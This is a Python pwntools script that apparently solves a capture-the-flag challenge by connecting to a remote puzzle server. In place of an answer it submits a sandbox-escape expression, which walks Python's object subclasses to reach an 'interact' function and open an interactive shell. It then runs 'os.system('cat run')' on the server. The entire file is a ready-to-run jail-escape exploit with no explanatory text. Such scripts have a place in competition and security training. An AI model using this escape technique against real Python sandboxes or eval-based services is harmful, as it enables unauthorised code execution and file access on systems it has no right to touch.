from pwn import *
import re

context.log_level = 'error'

def parse_target_and_numbers(data):
    target_match = re.search(r"Target: (\d+)", data)
    nums_match = re.search(r"Nums: ([\d\s]+)", data)
    if not target_match or not nums_match:
        return None, None
    target = int(target_match.group(1))
    numbers = list(map(int, nums_match.group(1).strip().split()))
    return target, numbers

def solve_round(io):
    io.sendline(b's') # Start a new round
    data = io.recvuntil(b'Your Answer:')
    target, numbers = parse_target_and_numbers(data.decode())
    if target is None or numbers is None:
        print("Failed to parse puzzle.")
        return False
    expr = f"1 if ([s:=().__class__.__base__.__subclasses__,s()[158]()(),s()[-3].write.__globals__['interact']()]) else {int(target)-1} + 1"
    io.sendline(expr.encode())
    io.sendline("code".encode())
    io.sendline("q".encode())
    io.sendline("import os; os.system('cat run')".encode())
    io.interactive()
    return True

def main():
    io = remote("challs.nusgreyhats.org", 33401)
    io.recvuntil(b'> ')
    solve_round(io)

if __name__ == "__main__":
    main()